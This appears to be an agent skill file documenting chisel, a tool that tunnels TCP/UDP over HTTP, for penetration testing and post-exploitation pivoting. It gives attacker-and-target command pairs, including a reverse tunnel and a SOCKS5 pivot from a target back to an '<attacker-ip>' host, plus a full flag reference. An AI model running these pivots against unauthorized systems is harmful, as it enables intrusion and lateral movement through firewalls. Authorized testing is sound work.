---
name: chisel
description: Create fast TCP/UDP tunnels transported over HTTP and secured via SSH. Use when performing network pivoting, bypassing firewalls, or establishing secure entry points into a network during penetration testing and post-exploitation.
---

# chisel

## Overview
Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. It is a single executable that includes both client and server components. It is primarily used for passing through firewalls or providing secure endpoints into a network. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume chisel is already installed. If you get a "command not found" error:

```bash
sudo apt update && sudo apt install chisel
```

## Common Workflows

### Basic Reverse Port Forward
**On the attacker (Server):**
```bash
chisel server --port 8080 --reverse
```
**On the target (Client):**
```bash
chisel client <attacker-ip>:8080 R:80:127.0.0.1:80
```
This maps the target's local port 80 to the attacker's port 80.

### SOCKS5 Proxy Pivot
**On the attacker (Server):**
```bash
chisel server --port 8080 --reverse
```
**On the target (Client):**
```bash
chisel client <attacker-ip>:8080 R:socks
```
This opens a SOCKS5 proxy on the attacker's machine (default port 1080) that tunnels traffic through the target.

### Local Port Forward
**On the target (Server):**
```bash
chisel server --port 8000
```
**On the attacker (Client):**
```bash
chisel client <target-ip>:8000 1234:127.0.0.1:445
```
This maps the attacker's local port 1234 to the target's port 445.

## Complete Command Reference

### Global Usage
```bash
chisel [command] [--help]
```

### Server Command
Runs chisel in server mode.

```bash
chisel server [options]
```

| Flag | Description |
|------|-------------|
| `--host <addr>` | Interface to bind to (default: `0.0.0.0`) |
| `-p, --port <port>` | Port to listen on (default: `8080`) |
| `--key <key>` | SSH key for server authentication |
| `--authfile <path>` | JSON file containing user/pass credentials |
| `--auth <user:pass>` | Single user/pass credential for clients |
| `--keepalive <interval>` | Keep-alive interval (default: `25s`) |
| `--max-idle <duration>` | Max idle time before closing connection |
| `--reverse` | Allow clients to specify reverse port forwarding |
| `--socks5` | Enable SOCKS5 proxy support |
| `--tls-key <path>` | Path to TLS private key file |
| `--tls-cert <path>` | Path to TLS certificate file |
| `--tls-domain <name>` | Domain name for TLS certificate |
| `--tls-ca <path>` | Path to CA certificate for client auth |
| `-v` | Verbose logging |

### Client Command
Runs chisel in client mode.

```bash
chisel client [options] <server> <remotes...>
```

| Argument | Description |
|----------|-------------|
| `<server>` | The address of the chisel server (e.g., `http://10.10.10.10:8080`) |
| `<remotes>` | One or more tunnel definitions (e.g., `80`, `3000:google.com:80`, `R:socks`) |

| Flag | Description |
|------|-------------|
| `--fingerprint <hash>` | Expected server SSH key fingerprint |
| `--auth <user:pass>` | Credentials for server authentication |
| `--keepalive <interval>` | Keep-alive interval (default: `25s`) |
| `--max-retry-count <n>` | Max number of times to retry connection |
| `--max-retry-interval <d>` | Max time between retries |
| `--proxy <url>` | HTTP proxy to connect through |
| `--header <key:val>` | Custom HTTP headers sent to server |
| `--hostname <name>` | Virtual host to use in HTTP requests |
| `--sni <name>` | Server Name Indication for TLS |
| `--tls-ca <path>` | Path to CA certificate for server auth |
| `--tls-skip-verify` | Skip TLS certificate verification |
| `-v` | Verbose logging |

## Notes
- **Reverse Tunnels**: The server must be started with the `--reverse` flag to allow clients to request reverse port forwards (`R:port...`).
- **Security**: By default, Chisel uses SSH for security, but it is recommended to use `--auth` or `--authfile` to prevent unauthorized access to your tunnels.
- **Fingerprinting**: Use the `--fingerprint` flag on the client to prevent Man-in-the-Middle (MitM) attacks by verifying the server's SSH key.